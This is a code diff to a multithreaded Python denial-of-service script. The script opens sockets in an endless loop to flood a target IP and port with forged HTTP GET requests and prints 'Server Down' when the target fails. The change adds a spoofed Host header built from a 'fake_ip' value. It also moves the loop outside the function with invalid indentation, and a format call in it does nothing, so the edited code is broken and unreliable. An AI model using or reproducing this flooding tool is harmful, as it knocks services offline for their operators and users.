@@ -87,8 +87,10 @@ def start():
     content    = "Content-Type: application/x-www-form-urlencoded\r\n"
     length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
     target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
+    target_host = "Host: " + fake_ip + "\r\n\r\n".format(str(ip), int(port))
     main_req  = target_host + useragen + accept + reffer + content + length + "\r\n"
-    while True:
+
+while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((str(ip),int(port)))
@@ -100,7 +102,6 @@ def start():
         except:
             s.close()
             print('[+] Server Down.')
-
 for x in range(thread):
     thred = threading.Thread(target=start)
     thred.start()
